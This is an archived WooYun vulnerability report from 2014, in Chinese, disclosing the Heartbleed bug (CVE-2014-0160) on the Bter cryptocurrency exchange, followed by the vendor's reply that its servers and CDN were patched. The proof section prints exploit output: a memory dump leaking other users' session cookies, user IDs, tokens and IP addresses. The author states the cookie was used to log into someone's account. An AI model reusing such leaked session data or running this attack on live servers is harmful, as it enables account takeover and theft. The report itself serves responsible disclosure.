<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		比特儿交易平台运维不当导致可能盗走别人的币  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		比特儿交易平台运维不当导致可能盗走别人的币  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/VIP">VIP</a> 
</li><li>提交时间：		2014-04-10 11:52</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2014-04-10：	细节已通知厂商并且等待厂商处理中<br/>
									2014-04-10：	厂商已经确认，细节仅向厂商公开<br/>
									2014-04-20：	细节向核心白帽子及相关领域专家公开<br/>
									2014-04-30：	细节向普通白帽子公开<br/>
									2014-05-10：	细节向实习白帽子公开<br/>
									2014-05-25：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">CVE-2014-0160</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">详见：http://www.oschina.net/news/50540/cve-2014-0160<br />
<br />
出现问题的是比特儿主站http://www.bter.com<br />
<br />
 </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail"></p><pre><code>Connecting...<br />
Sending Client Hello...<br />
Waiting for Server Hello...<br />
 ... received message: type = 22, ver = 0302, length = 66<br />
 ... received message: type = 22, ver = 0302, length = 2556<br />
 ... received message: type = 22, ver = 0302, length = 331<br />
 ... received message: type = 22, ver = 0302, length = 4<br />
Sending heartbeat request...<br />
 ... received message: type = 24, ver = 0302, length = 16384<br />
Received heartbeat response:<br />
  0000: 02 40 00 50 12 41 52 92 50 4F 53 54 20 2F 6A 73  .@.P.AR.POST /js<br />
  0010: 6F 6E 5F 73 76 72 2F 71 75 65 72 79 2F 3F 75 3D  on_svr/query/?u=<br />
  0020: 31 31 26 63 3D 35 37 39 36 30 34 20 48 54 54 50  11&amp;c=579604 HTTP<br />
  0030: 2F 31 2E 31 0D 0A 61 63 63 65 70 74 3A 20 2A 2F  /1.1..accept: */<br />
  0040: 2A 0D 0A 61 63 63 65 70 74 2D 65 6E 63 6F 64 69  *..accept-encodi<br />
  0050: 6E 67 3A 20 67 7A 69 70 0D 0A 61 63 63 65 70 74  ng: gzip..accept<br />
  0060: 2D 6C 61 6E 67 75 61 67 65 3A 20 7A 68 2D 43 4E  -language: zh-CN<br />
  0070: 2C 7A 68 3B 71 3D 30 2E 38 2C 65 6E 2D 55 53 3B  ,zh;q=0.8,en-US;<br />
  0080: 71 3D 30 2E 36 2C 65 6E 3B 71 3D 30 2E 34 0D 0A  q=0.6,en;q=0.4..<br />
  0090: 63 6F 6E 74 65 6E 74 2D 6C 65 6E 67 74 68 3A 20  content-length: <br />
  00a0: 33 38 0D 0A 63 6F 6E 74 65 6E 74 2D 74 79 70 65  38..content-type<br />
  00b0: 3A 20 61 70 70 6C 69 63 61 74 69 6F 6E 2F 78 2D  : application/x-<br />
  00c0: 77 77 77 2D 66 6F 72 6D 2D 75 72 6C 65 6E 63 6F  www-form-urlenco<br />
  00d0: 64 65 64 3B 20 63 68 61 72 73 65 74 3D 55 54 46  ded; charset=UTF<br />
  00e0: 2D 38 0D 0A 63 6F 6F 6B 69 65 3A 20 63 61 70 74  -8..cookie: capt<br />
  00f0: 63 68 61 5F 72 65 67 3D 64 31 65 30 62 31 36 35  cha_reg=d1e0b165<br />
  0100: 35 61 66 64 33 61 62 34 30 39 63 36 61 61 35 64  5afd3ab409c6aa5d<br />
  0110: 35 62 34 37 63 66 62 35 3B 20 75 69 64 3D 32 34  5b47cfb5; uid=24<br />
  0120: 31 37 33 3B 20 6E 69 63 6B 6E 61 6D 65 3D 6B 6F  173; nickname=ko<br />
  0130: 66 38 33 31 39 35 37 39 3B 20 70 76 65 72 3D 33  f8319579; pver=3<br />
  0140: 36 61 64 66 32 61 32 37 62 65 64 63 33 36 63 35  6adf2a27bedc36c5<br />
  0150: 34 33 39 63 39 63 62 36 32 36 34 61 32 32 37 3B  439c9cb6264a227;<br />
  0160: 20 5F 5F 63 66 64 75 69 64 3D 64 63 65 34 38 65   __cfduid=dce48e<br />
  0170: 30 39 36 38 30 62 39 38 66 32 37 32 34 66 63 34  09680b98f2724fc4<br />
  0180: 31 62 62 62 64 30 34 39 31 37 34 31 33 39 34 32  1bbbd04917413942<br />
  0190: 34 38 32 31 37 39 38 31 3B 20 48 6D 5F 6C 76 74  48217981; Hm_lvt<br />
  01a0: 5F 35 36 38 64 61 33 35 66 63 34 36 36 37 34 66  _568da35fc46674f<br />
  01b0: 65 32 34 63 33 36 61 38 35 62 38 34 61 63 36 37  e24c36a85b84ac67<br />
  01c0: 65 3D 31 33 39 33 39 30 39 35 33 37 3B 20 5F 5F  e=1393909537; __<br />
  01d0: 75 74 6D 61 3D 32 34 37 39 30 38 38 32 30 2E 31  utma=247908820.1<br />
  01e0: 35 37 30 33 32 32 36 30 35 2E 31 33 39 34 35 32  570322605.139452<br />
  01f0: 33 38 32 33 2E 31 33 39 36 30 38 33 38 37 33 2E  3823.1396083873.<br />
  0200: 31 33 39 36 31 35 35 35 37 38 2E 31 37 3B 20 5F  1396155578.17; _<br />
  0210: 5F 75 74 6D 7A 3D 32 34 37 39 30 38 38 32 30 2E  _utmz=247908820.<br />
  0220: 31 33 39 34 35 32 33 38 32 33 2E 31 2E 31 2E 75  1394523823.1.1.u<br />
  0230: 74 6D 63 73 72 3D 28 64 69 72 65 63 74 29 7C 75  tmcsr=(direct)|u<br />
  0240: 74 6D 63 63 6E 3D 28 64 69 72 65 63 74 29 7C 75  tmccn=(direct)|u<br />
  0250: 74 6D 63 6D 64 3D 28 6E 6F 6E 65 29 3B 20 6C 61  tmcmd=(none); la<br />
  0260: 6E 67 3D 63 6E 3B 20 63 61 70 74 63 68 61 3D 64  ng=cn; captcha=d<br />
  0270: 31 31 62 30 38 63 66 66 34 65 61 36 62 66 32 38  11b08cff4ea6bf28<br />
  0280: 38 37 30 38 38 32 32 62 62 38 36 38 39 37 38 3B  8708822bb868978;<br />
  0290: 20 6C 61 73 74 75 72 6C 3D 25 32 46 74 72 61 64   lasturl=%2Ftrad<br />
  02a0: 65 25 32 46 74 69 70 73 5F 63 6E 79 0D 0A 6F 72  e%2Ftips_cny..or<br />
  02b0: 69 67 69 6E 3A 20 68 74 74 70 73 3A 2F 2F 62 74  igin: https://bt<br />
  02c0: 65 72 2E 63 6F 6D 0D 0A 72 65 66 65 72 65 72 3A  er.com..referer:<br />
  02d0: 20 68 74 74 70 73 3A 2F 2F 62 74 65 72 2E 63 6F   https://bter.co<br />
  02e0: 6D 2F 74 72 61 64 65 2F 5A 45 54 5F 43 4E 59 0D  m/trade/ZET_CNY.<br />
  02f0: 0A 75 73 65 72 2D 61 67 65 6E 74 3A 20 4D 6F 7A  .user-agent: Moz<br />
  0300: 69 6C 6C 61 2F 35 2E 30 20 28 57 69 6E 64 6F 77  illa/5.0 (Window<br />
  0310: 73 20 4E 54 20 36 2E 31 3B 20 57 4F 57 36 34 29  s NT 6.1; WOW64)<br />
  0320: 20 41 70 70 6C 65 57 65 62 4B 69 74 2F 35 33 37   AppleWebKit/537<br />
  0330: 2E 33 36 20 28 4B 48 54 4D 4C 2C 20 6C 69 6B 65  .36 (KHTML, like<br />
  0340: 20 47 65 63 6B 6F 29 20 43 68 72 6F 6D 65 2F 33   Gecko) Chrome/3<br />
  0350: 31 2E 30 2E 31 36 35 30 2E 36 33 20 53 61 66 61  1.0.1650.63 Safa<br />
  0360: 72 69 2F 35 33 37 2E 33 36 0D 0A 78 2D 72 65 71  ri/537.36..x-req<br />
  0370: 75 65 73 74 65 64 2D 77 69 74 68 3A 20 58 4D 4C  uested-with: XML<br />
  0380: 48 74 74 70 52 65 71 75 65 73 74 0D 0A 48 6F 73  HttpRequest..Hos<br />
  0390: 74 3A 20 62 74 65 72 2E 63 6F 6D 0D 0A 43 64 6E  t: bter.com..Cdn<br />
  03a0: 2D 52 65 61 6C 2D 49 70 3A 20 31 31 33 2E 37 33  -Real-Ip: 113.73<br />
  03b0: 2E 31 34 36 2E 37 37 0D 0A 58 2D 63 61 72 64 3A  .146.77..X-card:<br />
  03c0: 20 4D 54 4D 35 4E 6A 6B 31 4F 54 49 35 4F 4A 38   MTM5Njk1OTI5OJ8<br />
  03d0: 36 6E 64 73 35 70 44 4E 38 38 57 45 63 79 77 0D  6nds5pDN88WEcyw.<br />
  03e0: 0A 43 6C 69 65 6E 74 2D 69 70 3A 20 31 31 33 2E  .Client-ip: 113.<br />
  03f0: 37 33 2E 31 34 36 2E 37 37 0D 0A 58 2D 46 6F 72  73.146.77..X-For<br />
  0400: 77 61 72 64 65 64 2D 46 6F 72 3A 20 31 31 33 2E  warded-For: 113.<br />
  0410: 37 33 2E 31 34 36 2E 37 37 0D 0A 0D 0A 56 1A 1B  73.146.77....V..<br />
  0420: 6E C0 F6 4E 2D BE 3B 90 28 C9 9A 24 D7 59 61 77  n..N-.;.(..$.Yaw<br />
  0430: 73 41 79 44 55 30 41 63 72 37 77 0D 0A 43 6C 69  sAyDU0Acr7w..Cli<br />
  0440: 65 6E 74 2D 69 70 3A 20 31 38 33 2E 30 2E 38 34  ent-ip: 183.0.84<br />
  0450: 2E 31 36 33 0D 0A 58 2D 46 6F 72 77 61 72 64 65  .163..X-Forwarde<br />
  0460: 64 2D 46 6F 72 3A 20 31 38 33 2E 30 2E 38 34 2E  d-For: 183.0.84.<br />
  0470: 31 36 33 0D 0A 0D 0A 5F E4 17 EB 5F E9 64 17 BE  163...._..._.d..<br />
  0480: 8F 2F 3F EF 5B 32 14 38 38 31 31 39 33 38 31 2E  ./?.[2.88119381.<br />
  0490: 37 33 3B 20 5F 5F 75 74 6D 63 3D 32 34 37 39 30  73; __utmc=24790<br />
  04a0: 38 38 32 30 3B 20 5F 5F 75 74 6D 7A 3D 32 34 37  8820; __utmz=247<br />
  04b0: 39 30 38 38 32 30 2E 31 33 38 37 36 38 32 31 39  908820.138768219<br />
  04c0: 30 2E 34 33 2E 39 2E 75 74 6D 63 73 72 3D 62 74  0.43.9.utmcsr=bt<br />
  04d0: 63 6B 61 6E 2E 63 6F 6D 7C 75 74 6D 63 63 6E 3D  ckan.com|utmccn=<br />
  04e0: 28 72 65 66 65 72 72 61 6C 29 7C 75 74 6D 63 6D  (referral)|utmcm<br />
  04f0: 64 3D 72 65 66 65 72 72 61 6C 7C 75 74 6D 63 63  d=referral|utmcc<br />
  0500: 74 3D 2F 70 72 69 63 65 3B 20 5F 5F 63 66 64 75  t=/price; __cfdu<br />
  0510: 69 64 3D 64 39 62 32 30 30 33 64 31 36 31 62 61  id=d9b2003d161ba<br />
  0520: 65 31 37 66 36 39 62 30 35 33 35 30 37 62 39 32  e17f69b053507b92<br />
  0530: 30 30 38 64 31 33 39 35 36 36 38 31 30 34 35 34  008d139566810454<br />
  0540: 30 3B 20 63 61 70 74 63 68 61 3D 34 66 64 32 39  0; captcha=4fd29<br />
  0550: 36 32 33 36 33 36 64 36 36 36 37 32 65 35 39 61  623636d66672e59a<br />
  0560: 38 36 62 36 63 30 38 36 38 62 30 3B 20 6C 61 73  86b6c0868b0; las<br />
  0570: 74 75 72 6C 3D 25 32 46 74 72 61 64 65 25 32 46  turl=%2Ftrade%2F<br />
  0580: 6C 74 63 5F 63 6E 79 3B 20 72 65 66 5F 75 69 64  ltc_cny; ref_uid<br />
  0590: 3D 31 32 30 32 30 0D 0A 43 64 6E 2D 52 65 61 6C  =12020..Cdn-Real<br />
  05a0: 2D 49 70 3A 20 32 31 39 2E 31 35 39 2E 32 34 36  -Ip: 219.159.246<br />
  05b0: 2E 31 34 31 0D 0A 58 2D 63 61 72 64 3A 20 4D 54  .141..X-card: MT<br />
  05c0: 4D 35 4E 6A 6B 31 4F 54 49 33 4E 31 48 39 66 35  M5Njk1OTI3N1H9f5<br />
  05d0: 79 39 5A 56 34 36 64 53 38 64 64 51 0D 0A 43 6C  y9ZV46dS8ddQ..Cl<br />
  05e0: 69 65 6E 74 2D 69 70 3A 20 32 31 39 2E 31 35 39  ient-ip: 219.159<br />
  05f0: 2E 32 34 36 2E 31 34 31 0D 0A 58 2D 46 6F 72 77  .246.141..X-Forw<br />
  0600: 61 72 64 65 64 2D 46 6F 72 3A 20 32 31 39 2E 31  arded-For: 219.1<br />
  0610: 35 39 2E 32 34 36 2E 31 34 31 0D 0A 0D 0A C8 F1  59.246.141......</code></pre><p class='detail'><br />
<br />
提取出cookie，成功登录用户帐号<br />
<br />
</p><p class="detail"><a href="../images/082009012bcc774958c1b47387d9f7dbfed35309.jpg" target="_blank"><img src="../images/082009012bcc774958c1b47387d9f7dbfed35309.jpg" alt="xxx.jpg" width="600"/></a></p><p class="detail"><br />
<br />
不少币哦<br />
<br />
</p><p class="detail"><a href="../images/08200922fae9caf4e902d243f06bf4bb1ae97811.jpg" target="_blank"><img src="../images/08200922fae9caf4e902d243f06bf4bb1ae97811.jpg" alt="xxxx.jpg" width="600"/></a></p><p class="detail"> </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">参照http://www.oschina.net/news/50540/cve-2014-0160进行升级 </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/VIP" title="VIP">VIP</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-056105" title="比特儿交易平台运维不当导致可能盗走别人的币">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：中</p>
						<p class="detail">漏洞Rank：5 </p>
													<p class="detail">确认时间：2014-04-10 15:06</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">比特儿官方所有服务器于4月8日 国外发布openssl漏洞的几个小时内就完成升级修补了漏洞。 4月9日网友 “困难户”为我们报告国内CDN服务商服务器漏洞，会暴露http访问头信息，存在潜在风险，我们立即通知了国内前端CDN（云分发）服务商升级服务器修补了漏洞。目前已经不受此漏洞影响，用户可放心使用。 感谢网友 “困难户” 和 wooyun 用户为我们及时报告。</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="56105";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
